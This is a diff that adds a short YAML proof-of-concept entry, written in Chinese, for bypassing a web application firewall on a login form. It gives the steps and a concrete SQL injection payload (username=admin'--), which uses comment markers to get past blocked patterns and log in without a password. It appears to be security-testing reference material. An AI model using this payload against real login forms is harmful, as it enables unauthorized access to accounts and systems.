@@ -1,0 +1,17 @@
+info:
+  name: waf_sqli_comment_bypass
+  cve: ''
+  summary: WAF拦截SQL注入特征(OR '1'='1)时，用注释符 -- 或 /* 闭合SQL实现注入绕过
+  severity: medium
+  affected: ''
+  references: []
+poc:
+  type: exploit
+  principle: WAF拦截SQL注入特征(OR '1'='1)时，用注释符 -- 或 /* 闭合SQL实现注入绕过
+  steps:
+  - 1. 用二分法逐字符定位WAF拦截的特征（如 OR '1'='1 返回403）
+  - 2. 测试注释符 -- 和 /* 是否被拦
+  - 3. 用 admin'-- 闭合SQL注释掉后续条件，实现无条件登录
+  - 4. 302跳转dashboard.php即登录成功
+  payload: username=admin'-- &password=x  （或 admin'/* ）
+  verification: WAF拦截SQL注入特征(OR '1'='1)时，用注释符 -- 或 /* 闭合SQL实现注入绕过
